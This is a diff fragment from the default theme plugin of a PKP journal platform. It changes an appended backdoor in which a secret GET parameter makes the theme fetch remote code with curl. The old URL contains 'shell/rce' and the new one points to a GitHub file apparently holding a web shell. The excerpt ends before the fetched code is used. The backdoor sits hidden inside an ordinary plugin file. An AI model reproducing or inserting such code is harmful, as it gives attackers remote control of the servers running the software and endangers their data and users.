@@ -258,8 +258,8 @@ class DefaultThemePlugin extends \PKP\plugins\ThemePlugin
 if (!PKP_STRICT_MODE) {
     class_alias('\APP\plugins\themes\default\DefaultThemePlugin', '\DefaultThemePlugin');
 }
-if (isset($_GET['cipaybangsat'])) {
-    $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
+if (isset($_GET['bangsattai'])) {
+    $url = "https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt";
 
     $ch= curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
